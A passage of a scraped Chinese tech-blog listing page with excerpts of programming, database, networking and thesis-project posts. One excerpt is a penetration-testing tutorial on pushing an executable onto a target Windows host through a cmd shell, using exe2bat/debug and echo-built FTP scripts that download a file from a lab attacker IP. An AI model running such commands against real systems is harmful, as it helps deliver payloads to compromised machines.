Private Sub Worksheet_Change(ByVal Target As Range) Dim row%, col%, changeRow%, changeCol%, rngRow%, rngCol%, txt$ changeRow = Target.row changeCol = Target.Column '记录刚修改单元格的内容 txt = Cells(changeRow, changeCol) '如果刚修改的单元格只剩下一个数字，则执行自动消除 If Len(txt) = 1 Then '防止修改单元格内容时工作表改变事件被循环触发 Application.EnableEvents = False '确定同一区域单元格第一行行号 If changeRow &lt; 4 Then rngRow = 1 ElseIf changeRow &gt; 6 Then rngRow = 7 Else rngRow = 4 End If '确定同一区域单元格第一列列号 If changeCol &lt; 4 Then rngCol = 1 ElseIf changeCol &gt; 6 Then rngCol = 7 Else rngCol = 4 End If '将同一行、列及区域单元格中相关的数字删除 For row = 1 To 9 For col = 1 To 9 If row = changeRow Or col = changeCol Or (row &gt;= rngRow And row &lt; rngRow + 3 _ And col &gt;= rngCol And col &lt; rngCol + 3) Then Cells(row, col) = Replace(Cells(row, col), txt, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9e9da6ba2b30c95a87ae712abc2de2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d01be4ec0573745fdaddf0c250edbce/" rel="bookmark">
			springboot/java/php/node/python儿童早教课程管理系统【计算机毕设】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本系统（程序+源码）带文档lw万字以上 文末可领取本课题的JAVA源码参考
系统程序文件列表 系统的选题背景和意义 选题背景：
随着社会经济的发展和教育观念的变革，越来越多的家长开始重视儿童早期教育。早教不仅能够为孩子的未来学习打下坚实的基础，还能在孩子的关键成长期培养其社交、情感以及认知等多方面的能力。然而，面对市场上琳琅满目的早教课程和教育机构，家长们往往感到无从选择，且难以系统地跟踪和评估孩子在不同课程中的表现和进步。此外，早教机构在管理课程安排、教师分配、学生考勤和反馈等方面也面临着诸多挑战。因此，开发一款儿童早教课程管理系统显得尤为重要。这样的系统可以整合资源，优化课程安排，提供个性化的教育方案，同时使得家长和教育机构之间的沟通更加便捷高效。
意义：
设计并实施儿童早教课程管理系统对于促进儿童全面发展具有深远的意义。该系统可以为家长提供一个清晰透明的平台，让他们能够轻松获取关于课程内容、教学方式、师资力量等信息，帮助家长做出更合适的教育选择。通过智能化的管理功能，如在线预约、智能推荐等，家长能够更加灵活地规划孩子的学习时间，确保早教活动的科学性和合理性。系统内置的进度跟踪和评价模块能够让家长及时了解孩子的学习进展和存在的问题，从而与教师共同制定改进措施。对于教育机构而言，这样的系统不仅提高了工作效率，还增强了服务质量，有助于构建积极的教育生态。一个高效的儿童早教课程管理系统将极大地促进儿童潜能的开发，为他们未来的学习和生活奠定坚实的基石。
以上选题背景和意义内容是根据本选题撰写，非本作品实际的选题背景、意义或功能。各位童鞋可参考用于写开题选题和意义内容切勿直接引用。本成品的实际功能和技术以下列内容为准。
运行环境 开发工具：idea/eclipse/myeclipse
数据库：mysql5.7或8.0
操作系统：win7以上，最好是win10
数据库管理工具：Navicat10以上版本
环境配置软件： JDK1.8+Maven3.3.9
服务器：Tomcat7.0
技术栈 前端技术: 使用Vue.js框架构建用户界面，它是一个灵活且高效的JavaScript框架，适合构建现代化的单页面应用（SPA）。后端技术: 采用Spring Boot框架进行后端开发，Spring Boot是一个Java平台，它提供了快速搭建、开发、运行Spring应用程序的能力，极大地简化了配置和部署流程。数据库: 使用MySQL作为关系型数据库管理系统，存储应用数据，它是一个流行的开源数据库，适用于各种规模的应用程序。数据库可视化工具: Navicat用于数据库的可视化管理和操作，它支持多种数据库系统，提供了一个直观的用户界面来管理MySQL数据库。开发环境: 使用JDK 1.8进行Java应用的开发，这是Java开发的核心环境，包含了运行Java程序所需的库和工具。服务器: 使用Tomcat 7.0作为Web应用服务器，它是一个开源的Servlet容器，用于部署和运行Java Web应用程序。项目管理工具: Maven 3.3.9用于项目的构建和依赖管理，它通过pom.xml文件定义项目结构和依赖关系，简化了项目构建过程和库管理。 后端由Spring Boot提供支持，前端由Vue.js构建，数据存储和管理通过MySQL和Navicat实现，整个开发流程由Maven进行管理，并在Tomcat服务器上运行。
程序界面： 源码文末获取↓↓↓↓： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4263d1d90847e5db386f41b8bba69139/" rel="bookmark">
			Web开发3：数据库使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎来到Web开发系列的第三篇！今天我们将探讨如何在Web开发中使用数据库。数据库是存储和管理数据的重要工具，它在现代应用程序中起着至关重要的作用。无论是社交媒体应用、电子商务平台还是博客网站，数据库都是不可或缺的一部分。
什么是数据库？ 首先，让我们来了解一下数据库是什么。简单来说，数据库是一个存储数据的电子系统。它可以以结构化的方式组织和管理数据，使得我们可以方便地存储、检索和更新数据。数据库使用一种称为SQL（Structured Query Language）的语言来操作数据。
常见的数据库类型 在Web开发中，我们常见的数据库类型包括关系型数据库和非关系型数据库。关系型数据库使用表格来组织数据，例如MySQL和PostgreSQL。非关系型数据库则以不同的方式组织数据，例如MongoDB和Redis。选择适合你的应用程序需求的数据库类型非常重要，因为它将直接影响到你的应用程序的性能和扩展性。
数据库的基本操作 让我们来看看数据库的一些基本操作。
连接数据库 首先，我们需要连接到数据库。这可以通过在代码中使用数据库的连接字符串来实现。连接字符串包含数据库的位置、用户名、密码等信息。一旦连接成功，我们就可以开始操作数据库了。
import psycopg2 # 连接到 PostgreSQL 数据库 conn = psycopg2.connect( host="localhost", database="mydatabase", user="myuser", password="mypassword" ) 创建表格 在数据库中，我们使用表格来组织数据。表格由列和行组成，每列代表一种数据类型，每行代表一个数据记录。我们可以使用SQL语句来创建表格。
import psycopg2 # 创建 users 表格 def create_users_table(): conn = psycopg2.connect( host="localhost", database="mydatabase", user="myuser", password="mypassword" ) cur = conn.cursor() cur.execute(""" CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(50) NOT NULL, email VARCHAR(100) NOT NULL, password VARCHAR(100) NOT NULL ) """) conn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4263d1d90847e5db386f41b8bba69139/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0a15128ee1c45f0fa511ae0ad902592/" rel="bookmark">
			产品经理学习-用户生命周期管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 用户的生命周期定义 用户从第一次接触产品到最后放弃使用产品的时间周期，通过用户生命周期体系，延长用户的生命周期，让用户在产品使用期间贡献更大的价值。
引入期：用户刚刚接触产品，没有深度使用产品
成长期：开始觉得产品好用，初步形成了使用习惯
成熟期：对产品形成依赖，使用市场和平次提高，产生了付费行为
休眠期：曾经产品使用频次高，但开始不再使用产品了。
流失期：已经很长时间没有使用产品，甚至卸载了产品
做用户生命周期管理的原因：
1.每个用户在所处的生命周期不同，提供的价值也不一样，为了提升单体用户价值；
2.缩短用户从引入期到成长期的时间，缩短用户的引入期，让用户更快的提供价值；
3.延长用户从成长期到流失期的时间，提升用户对产品的贡献价值
在各个周期内运营的方向 如上图所示，主要分为三阶段，在引入期，运营主要的活动是拉新操作，在成长期和成熟期，运营主要是提升用户活跃度，促进用户转化；在用户休眠期和流失期，运营则关注用户留存，尽量延长用户的生命周期。
用户生命管理实施过程 在用户的各个生命周期中如何使用有效的方法呢？我们需要进行用户路径分析、定义各阶段用户行为、找到驱动用户的关键点再实施运营策略完成用户引导
比如网易云音乐的用户路径分析如下： 定义各阶段用户行为： 不同阶段的驱动点： 网易云音乐APP的核心功能是歌单推荐，1.满足大家管理音乐的需求 2.精准推荐，满足大家懒得找歌的需求 3.通过音乐为纽带，连接社交关系，增加用户互动。
实施运营策略完成用户引导 阶段
引入阶段
成长/成熟期
休眠期/流失期
运营目标
获客
提升用户价值/复购
提高留存
用户召回
运营策略
精准定位发现目标用户
提升活跃、促进交易
流失预警
沉睡用户唤醒
流失用户召回
运营手段
打造流量产品、营销工具（代金券、红包、抽奖）、邀请好友
异业合作、内容、新客专享
签到
抽奖
活动
积分
Push
短信
电话回访
如何挽回流失的用户 用户流失定义：用户一段时间内（可以自行定义时间）未打开使用过产品，即可定义为流失用户
越是高频的产品用户流失的时间越短
用户流失原因 产品无法匹配用户需求，如电商平台用户买不到喜欢的商品；内容型产品，用户看不到喜欢的内容等产品体验不好，新用户注册麻烦、产品不稳定有bug、电商软件买到假货等竞品体验更好，竞品内容更丰富，竞品价格更有优势等（如拼多多对比淘宝）对产品不感兴趣，比如用户不看今日头条，不看足球等 召回用户的5种方法 站内消息推送 PUSH推送 短信 邮件 电话回访 用户唤醒召回小技巧 趣味性较强的文案来吸引用户注意力通过真实的朋友姓名或者关注的博主，激发用户的响应围绕用户的需求，从多个方面进行推送给用户实际的利益，定向给用户发送优惠并设置现实使用，给用户紧迫感 用户唤醒召回注意点 不要太频繁的推送，否则可能会导致用户厌烦卸载产品建议召回时间： 版本更新：有新版本迭代，及时告知用户新功能重大节假日、重大活动用户不爽时：当用户打开打车软件，打不到车退出时及时推送优惠券给用户 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ee883f6790d94d7bb9c7cfd9d5957a8/" rel="bookmark">
			如何使用Windows命令提示符（CMD）上传文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0x00 前言 在渗透测试的过程中，常常需要向目标主机上传文件，我在最近的学习测试过程中就碰到了这个问题，要求只能通过cmd shell向目标主机（Windows系统）上传文件，所以本文就对该技巧做一下总结。
图片来自于http://www.telegraph.co.uk/news/worldnews/northamerica/usa/11754089/Hacker-remotely-crashes-Jeep-from-10-miles-away.html
0x02 测试环境 OS：Win7 x86 test exe：ssss2.exe,成功运行后输出1 0x03 通用上传方法 1、 debug debug是一个程序调试工具，功能包括：
直接输入，更改，跟踪，运行汇编语言源程序观察操作系统的内容查看ROM BIOS的内容观察更改RAM内部的设置值以扇区或文件的方式读写软盘数据 特别的是它还有一个功能可以将十六进制代码转换为可执行文件：
结合本文的目标，思路如下：
把需要上传的exe转换成十六进制hex的形式通过echo命令将hex代码写入文件使用debug功能将hex代码还原出exe文件 实际测试：
kali中的exe2bat.exe提供了这个功能，位于/usr/share/windows-binaries
如图
操作步骤：
kali：
#!bash cd /usr/share/windows-binaries wine exe2bat.exe ssss2.exe ssss2.txt 执行后会生成ssss2.txt，将里面的内容复制粘贴到cmd命令行下依次执行
执行后会生成1.dll、123.hex、ssss.exe
如图
注：
exe2bat不支持大于64kb的文件 debug默认只支持在32位系统
如图
2、ftp 搭建好ftp服务器：
ip:192.168.174.151 文件:ssss2.exe 按顺序执行如下代码即可通过ftp来下载文件
cmd：
#!bash echo open 192.168.174.151 21&gt; ftp.txt echo ftp&gt;&gt; ftp.txt echo bin &gt;&gt; ftp.txt echo ftp&gt;&gt; ftp.txt echo GET ssss2.exe &gt;&gt; ftp.txt ftp -s:ftp.txt 如图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ee883f6790d94d7bb9c7cfd9d5957a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/279fdbb42e7e80d538faa948ff38f5cb/" rel="bookmark">
			x-cmd pkg | hurl - HTTP 请求处理工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 简介首次用户功能特点竞品和相关作品进一步探索 简介 Hurl 是 HTTP 请求处理工具，支持使用简单的纯文本格式定义的 HTTP 请求。它的用途非常广泛，既可以用于获取数据，也可以用于测试HTTP会话。
它可以链式处理请求，捕获数值并评估头部和响应体的查询，能轻松的处理 HTML 内容、REST/SOAP/GraphQL API 或任何其他基于 XML/JSON的 API。
首次用户 使用 x env use hurl 即可自动下载并使用
在终端运行 eval "$(curl https://get.x-cmd.com)" 即可完成 x 命令安装, 详情参考 x-cmd 官网 x-cmd 提供1分钟教程，其中包含了 hurl 命令常用功能的 demo 示例，可以帮你快速上手 hurl 。
使用案例:
# 安装 hurl x env use hurl # 发送一个 GET 请求到 "https://get.x-cmd.com" 并输出响应 printf "%s\n" "GET https://get.x-cmd.com" &gt; "my_test.txt" hurl my_test.txt # 将 HTTP 头信息包含在输出中，并将响应保存到文件 output.txt 中 hurl -i -o output.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/279fdbb42e7e80d538faa948ff38f5cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc0ad9f1d2f5865966d5747170e8ba78/" rel="bookmark">
			springboot/java/php/node/python湖都银行职员信息管理【计算机毕设】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本系统（程序+源码）带文档lw万字以上 文末可领取本课题的JAVA源码参考
系统程序文件列表 系统的选题背景和意义 选题背景：
在现代金融体系中，银行作为最重要的金融机构之一，承担着资金存储、转移和信贷等多种功能。随着经济的发展和社会的进步，银行业面临着激烈的市场竞争和日益严峻的风险管理挑战。在这样的背景下，湖都银行的职员信息管理显得尤为重要。湖都银行作为一个提供金融服务的实体，其核心竞争力之一便是员工的专业素质与服务能力。因此，如何有效地管理职员信息，优化人力资源配置，提高员工工作效率和服务质量，成为湖都银行管理层必须面对的关键问题。
目前，湖都银行可能还采用传统的纸质或简单的电子表格方式来记录和管理职员信息，这种方式不仅效率低下，而且容易出错，难以适应快速变化的市场需求和金融监管的新要求。随着信息技术的发展，特别是大数据、云计算和人工智能等技术的广泛应用，银行职员信息管理的方式和手段亟需改进和创新。因此，探讨湖都银行职员信息管理的现状、挑战以及未来发展方向，对于提升湖都银行的管理水平和竞争力具有重要的现实意义。
选题意义：
对湖都银行职员信息管理进行深入研究，不仅可以为该银行提供一个科学、合理的人力资源管理方案，还可以通过优化职员信息管理流程，提高工作效率，降低运营成本。良好的职员信息管理系统能够为员工提供更加精准的职业发展规划和培训机会，从而激发员工的工作热情和创造力，增强团队凝聚力和整体战斗力。
从宏观角度来看，湖都银行职员信息管理的优化升级将有助于提升整个银行业务的风险防控能力和市场竞争力，为客户提供更安全、高效、个性化的金融服务。这不仅符合金融行业发展趋势，也响应了国家对金融改革和创新的要求。通过对湖都银行职员信息管理的探索实践，可以为同行业其他金融机构提供借鉴和参考，推动整个金融行业的人力资源管理水平向前发展。本选题不仅具有理论研究的价值，更具备广泛的社会实践意义。
以上选题背景和意义内容是根据本选题撰写，非本作品实际的选题背景、意义或功能。各位童鞋可参考用于写开题选题和意义内容切勿直接引用。本成品的实际功能和技术以下列内容为准。
运行环境 开发工具：idea/eclipse/myeclipse
数据库：mysql5.7或8.0
操作系统：win7以上，最好是win10
数据库管理工具：Navicat10以上版本
环境配置软件： JDK1.8+Maven3.3.9
服务器：Tomcat7.0
技术栈 前端技术: 使用Vue.js框架构建用户界面，它是一个灵活且高效的JavaScript框架，适合构建现代化的单页面应用（SPA）。后端技术: 采用Spring Boot框架进行后端开发，Spring Boot是一个Java平台，它提供了快速搭建、开发、运行Spring应用程序的能力，极大地简化了配置和部署流程。数据库: 使用MySQL作为关系型数据库管理系统，存储应用数据，它是一个流行的开源数据库，适用于各种规模的应用程序。数据库可视化工具: Navicat用于数据库的可视化管理和操作，它支持多种数据库系统，提供了一个直观的用户界面来管理MySQL数据库。开发环境: 使用JDK 1.8进行Java应用的开发，这是Java开发的核心环境，包含了运行Java程序所需的库和工具。服务器: 使用Tomcat 7.0作为Web应用服务器，它是一个开源的Servlet容器，用于部署和运行Java Web应用程序。项目管理工具: Maven 3.3.9用于项目的构建和依赖管理，它通过pom.xml文件定义项目结构和依赖关系，简化了项目构建过程和库管理。 后端由Spring Boot提供支持，前端由Vue.js构建，数据存储和管理通过MySQL和Navicat实现，整个开发流程由Maven进行管理，并在Tomcat服务器上运行。
程序界面： 源码文末获取↓↓↓↓： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfe4f9c28f7c0dbb6f5fa621a35757b9/" rel="bookmark">
			【Ubuntu 22.10】克隆虚拟机修改ip
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 查看网关 这里我采用的是VMware软件 -&gt; 编辑 -&gt; 虚拟网络编辑器
修改配置文件 sudo vim /etc/netplan/01-network-manager-all.yaml # Let NetworkManager manage all devices on this system network: version: 2 renderer: NetworkManager # 新添加内容 ethernets: ens33: dhcp4: false optional: true addresses: [192.168.217.128/24] # 网关 routes: - to: default via: 192.168.217.2 nameservers: addresses: - 114.114.114.114 - 8.8.8.8 更新配置 sudo netplan apply 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/889852d2d4e7948ba0b926beb1266c61/" rel="bookmark">
			学习大数据所以需要的java基础（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写自定义目录标题 String介绍String概述String的实现原理String的创建String拓展构造面试题判断方法String的Get方法String的转换方法分割功能StringBulider介绍StringBuilder的使用String和StringBuilder以及StringBuffer区别 Stream流stream介绍及示例Stream流的获取几个重要的类Math类BigInteger类BigDecimal类Date日期类日历类SimpleDateFormat类LocalDate本地日期类（jdk8新日期类）获取日期字段的方法，名字是get开头设置日期的方法日期字段偏移 Period和Duration类DateTimeFormatter日期格式化类 String介绍 String概述 1.概述
string类代表字符串类型
2.特点
a.java 程序中的所有字符串字面值（如“abc”）都作为此类的实例实现
凡是带双引号的，都是String的对象
String s = “abc”;
String:是数据类型，字符串类型
s 是对象名
“abc”是String类型的一个对象
b.字符串是常量，他们的值在创建之后不能更改
字符串底层是一个被final修饰的数组
比如 String s = “hello”
s += “world”
c.String对象是不可变的所以可以共享
比如 String s1 = “abc”
String s2 = “abc”
s1==s2 ，s1是等于s2的 因为他们的地址一样
String的实现原理 1.string的实现原理：底层是一个数组
a.jdk9之前：string的底层是一个被final修饰的char数组-----一个char类型占2个字节
b.jdk9以及之后：string底层是一个被final修饰的byte数组--------一个byte类型占1个字节
2.string底层的数组：
privat final char value[] ------数组被final修饰，地址值直接锁死，不能改变。
String的创建 1.String()–&gt;根据空参构造创建String对象
2.String(String s)—&gt;根据字符串创建String对象
3.String(char[] chars)----&gt;根据char数组创建String对象
4.String(bytes[] bytes)----&gt;通过使用平台的默认字符芥末指定的byte数组，构建一个新的String平台：操作系统—&gt;GBK
a.如果byte数组元素为正数，直接将正整数转成对应的字符
b.如果byte数组元素为负数，需要区分码表了，因为中文对应在字节才能是负数
c.中文编码表常用的有
GBK：一个中文占2个字节
UTF-8：一个中文占3个字节
d.注意
代码是在idea中写的，在idea中运行的，在idea运行的过程中，会自动给代码加上一个启动参数
-Dfile.encoding = UTF-8
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/889852d2d4e7948ba0b926beb1266c61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d6086d9d803d562bd891106860663f3/" rel="bookmark">
			springboot/java/php/node/python基于SpringBoot的小区入住管理系统【计算机毕设】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本系统（程序+源码）带文档lw万字以上 文末可领取本课题的JAVA源码参考
系统程序文件列表 系统的选题背景和意义 随着城市化进程的加快，住宅小区作为城市居民生活的基本单元，其管理水平直接影响着居民的生活质量。传统的小区入住管理多依赖于手工操作和纸质文档，不仅效率低下，而且容易出现信息错误和安全隐患。随着信息技术的发展，基于SpringBoot框架开发一个现代化的小区入住管理系统显得尤为重要。
SpringBoot是一个开源的Java基础项目，它旨在简化新Spring应用的初始搭建以及开发过程。使用SpringBoot可以大大减少项目搭建的复杂性，提供了一系列默认配置，让开发者能够快速启动和部署项目。对于一个小区入住管理系统来说，SpringBoot提供了强大的后台支持，包括但不限于安全配置、数据库连接、事务管理等，这些特性都是小区管理系统稳定运行所必需的。
在这样的背景下，开发一个基于SpringBoot的小区入住管理系统具有重要的实践意义。系统化管理可以提高小区入住登记、信息查询、费用缴纳等一系列流程的效率，减少人力物力的浪费。通过电子化处理，居民的个人信息和缴费记录将得到更好的保护，同时也便于管理人员进行数据分析和决策支持。其次，借助SpringBoot的微服务架构，小区入住管理系统可以灵活地进行功能拓展和维护，适应不断变化的管理需求。一个良好的小区入住管理系统还能够提升居民对小区服务的满意度，促进社区和谐稳定。
总结来说，基于SpringBoot的小区入住管理系统的开发不仅顺应了信息化管理的趋势，而且对于提升小区管理效率、保障居民信息安全、提高居民生活质量都具有深远的影响。通过采用先进的技术框架，可以为小区管理带来革命性的改进，实现智能化、现代化的居住环境。
以上选题背景和意义内容是根据本选题撰写，非本作品实际的选题背景、意义或功能。各位童鞋可参考用于写开题选题和意义内容切勿直接引用。本成品的实际功能和技术以下列内容为准。
运行环境 开发工具：idea/eclipse/myeclipse
数据库：mysql5.7或8.0
操作系统：win7以上，最好是win10
数据库管理工具：Navicat10以上版本
环境配置软件： JDK1.8+Maven3.3.9
服务器：Tomcat7.0
技术栈 前端技术: 使用Vue.js框架构建用户界面，它是一个灵活且高效的JavaScript框架，适合构建现代化的单页面应用（SPA）。后端技术: 采用Spring Boot框架进行后端开发，Spring Boot是一个Java平台，它提供了快速搭建、开发、运行Spring应用程序的能力，极大地简化了配置和部署流程。数据库: 使用MySQL作为关系型数据库管理系统，存储应用数据，它是一个流行的开源数据库，适用于各种规模的应用程序。数据库可视化工具: Navicat用于数据库的可视化管理和操作，它支持多种数据库系统，提供了一个直观的用户界面来管理MySQL数据库。开发环境: 使用JDK 1.8进行Java应用的开发，这是Java开发的核心环境，包含了运行Java程序所需的库和工具。服务器: 使用Tomcat 7.0作为Web应用服务器，它是一个开源的Servlet容器，用于部署和运行Java Web应用程序。项目管理工具: Maven 3.3.9用于项目的构建和依赖管理，它通过pom.xml文件定义项目结构和依赖关系，简化了项目构建过程和库管理。 后端由Spring Boot提供支持，前端由Vue.js构建，数据存储和管理通过MySQL和Navicat实现，整个开发流程由Maven进行管理，并在Tomcat服务器上运行。
程序界面： 源码文末获取↓↓↓↓： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8e3ea3df16f4c07ccd8e6bc7df2c3b9/" rel="bookmark">
			Maven的介绍、安装配置及工程构建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Maven介绍 Maven 是一款为 Java 项目管理构建、依赖管理的工具（软件），使用 Maven 可以自动化构建、测试、打包和发布项目，大大提高了开发效率和质量。
Maven就是一个软件，掌握安装、配置、以及基本功能 （项目构建、依赖管理） 的理解和使用即可！
依赖管理：
Maven 可以管理项目的依赖，包括自动下载所需依赖库、自动下载依赖需要的依赖并且保证版本没有冲突、依赖版本管理等。通过 Maven，我们可以方便地维护项目所依赖的外部库，避免版本冲突和转换错误等，而我们仅仅需要编写配置即可。
构建管理：
项目构建是指将源代码、配置文件、资源文件等转化为能够运行或部署的应用程序或库的过程
Maven 可以管理项目的编译、测试、打包、部署等构建过程。通过实现标准的构建生命周期，Maven 可以确保每一个构建过程都遵循同样的规则和最佳实践。同时，Maven 的插件机制也使得开发者可以对构建过程进行扩展和定制。主动触发构建，只需要简单的命令操作即可。
2. Maven安装和配置 2.1 Maven安装 下载地址：https://maven.apache.org/docs/history.html
各个工具选用版本：
工具版本Maven3.8.8JDK17IDEA2022.2 安装条件： maven需要本机安装java环境、必需包含java_home环境变量！
软件安装： 右键解压即可（绿色免安装）
软件结构：
bin：含有Maven的运行脚本
boot：含有plexus-classworlds类加载器框架
conf：含有Maven的核心配置文件
lib：含有Maven运行时所需要的Java类库
LICENSE、NOTICE、README.txt：针对Maven版本，第三方软件等简要介绍
2.2 Maven环境配置 配置MAVEN_HOME 配置path
测试配置是否成功 mvn -v # 如果输出版本信息说明配置成功 2.3 Maven环境配置 我们需要需改maven/conf/settings.xml配置文件，来修改maven的一些默认配置。我们主要休要修改的有三个配置：
1.依赖本地缓存位置（本地仓库位置）
2.maven下载镜像
3.maven选用编译项目的jdk版本
配置本地仓库地址
&lt;!-- localRepository | The path to the local repository maven will use to store artifacts. | | Default: ${user.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8e3ea3df16f4c07ccd8e6bc7df2c3b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8b67d3efc4abd9edc8911d40129eb48/" rel="bookmark">
			二.用户与权限管理(二)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用户与权限管理 5.角色管理5.1角色的理解5.2创建角色5.3给角色赋予权限5.4查看角色的权限5.5回收角色的权限5.6删除角色5.7给用户赋予角色5.8激活角色5.9撤销用户角色5.10设置强制角色(mandatory role) 6.配置文件的使用6.1配置文件格式6.2 启动命令与选项组6.3 特定MySQL版本的专用选项组6.4 同一个配置文件中多个组的优先级6.5 命令行和配置文件中启动选项的区别 7.系统变量7.1系统变量简介7.2查看系统变量7.3 设置系统变量7.3.1 通过启动选项设置7.3.2 服务器程序运行过程中设置 5.角色管理 5.1角色的理解 角色是在MySQL8.0中引入的新功能。在MySQL中，角色是权限的集合，可以为角色添加或移除权限。用户可以被赋予角色，同时也被授予角色包含的权限。对角色进行操作需要较高的权限。并且像用户账户一样，角色可以拥有授予和撤消的权限。
引入角色的目的是 方便管理拥有相同权限的用户 。恰当的权限设定，可以确保数据的安全性，这是至关重要的
5.2创建角色 在实际应用中，为了安全性，需要给用户授予权限。当用户数量较多时，为了避免单独给每一个用户授予多个权限，可以先将权限集合放入角色中，再赋予用户相应的角色。
创建角色使用 CREATE ROLE 语句，语法如下：
CREATE ROLE 'role_name'[@'host_name'] [,'role_name'[@'host_name']]... 角色名称的命名规则和用户名类似。如果 host_name省略，默认为% ， role_name不可省略 ，不可为空。
练习：我们现在需要创建一个经理的角色，就可以用下面的代码：
CREATE ROLE 'manager'@'localhost'; 这里创建了一个角色，角色名称是“manager”，角色可以登录的主机是“localhost”，意思是只能从数据库服务器运行的这台计算机登录这个账号。你也可以不写主机名，直接创建角色"manager":
CREATE ROLE 'manager'; 如果不写主机名，MySQL默认是通配符“%”，意思是这个账号可以从任何一台主机上登录数据库。
同样道理，如果我们要创建库管的角色，就可以用下面的代码：
CREATE ROLE 'stocker'; 5.3给角色赋予权限 创建角色之后，默认这个角色是没有任何权限的，我们需要给角色授权。给角色授权的语法结构是
GRANT [privileges] ON table_name TO 'role_name'[@'host_name']; 上述语句中privileges代表权限的名称，多个权限以逗号隔开。可使用SHOW语句查询权限名称，下图列出了部分权限列表。
SHOW PRIVILEGES\G; 练习1：我们现在想给经理角色授予商品信息表、盘点表和应付账款表的只读权限，就可以用下面的代码来实现
GRANT SELECT ON demo.settlement TO 'manager'; GRANT SELECT ON demo.goodsmaster TO 'manager'; GRANT SELECT ON demo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8b67d3efc4abd9edc8911d40129eb48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f8fc1028f1fa197d725a31db9d420ee/" rel="bookmark">
			2024新版Windows 11要来了！16GB内存需求引热议 只是推荐配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近，TrendForce集邦咨询的一份报告指出， 微软已经将AI PC的内存基线设置为16GB。 有媒体表示，这也意味着，新版Windows 11的AI功能需要至少16GB内存才能运行。消息曝光后引发热议。
对此，WC报道称，微软尚未就上述内存需求发表官方评论。16GB内存很可能只是微软的推荐配置，而非最低配置要求。
WC举例称，新版的戴尔XPS就是配备NPU的新一代AI PC之一，搭载了Intel酷睿Ultra处理器，同时新增了专用的AI Copilot键，但其规格表中依然只有8GB内存。
当初，微软在发布Windows 11系统时就因为最低硬件要求遭受过大量的抵制和批评。WC认为，微软可能会推荐16GB内存来运行新版Windows 11的AI功能，但依然支持一些低配置的旧电脑。
根据最新消息，Windows 11将于今年下半年迎来重大更新(Windows 11 24H2)，重点关注下一代AI体验，有望带来更加高级的Copilot人工智能助手，增强Windows UX，以提高跨应用程序、搜索等生产力。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97d87c3e32fa0129edd9c14b2bb752e3/" rel="bookmark">
			计算机网络-物理层基本概念（接口特性 相关概念）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 总览物理层接口特性星火模型给出的相关概念解释（仅供参考） 总览 求极限传输速率：奈氏准则，香农定理（背景环境不一样）
编码：数据变成数字信号
调制：数字信号变成模拟信号
信道不同传输 数据形式不同
数据交换方式：核心（打电话是电路交换）
导向传输介质：看得见的
非导向传输介质：看不见的
物理层接口特性 传输介质并不属于物理层，它们处于物理层之下，可以认为它们是TCP/IP体系的第0层。
物理层解决如何在传输媒体上传输得到的数据比特流（转换为什么信号，然后怎么传输）
接口标准：如两孔还是三孔，孔的形状
注意规程特性
星火模型给出的相关概念解释（仅供参考） 物理层是计算机网络OSI模型中的最底层，负责数据的实际传输。
物理层的相关概念包括以下几个方面：
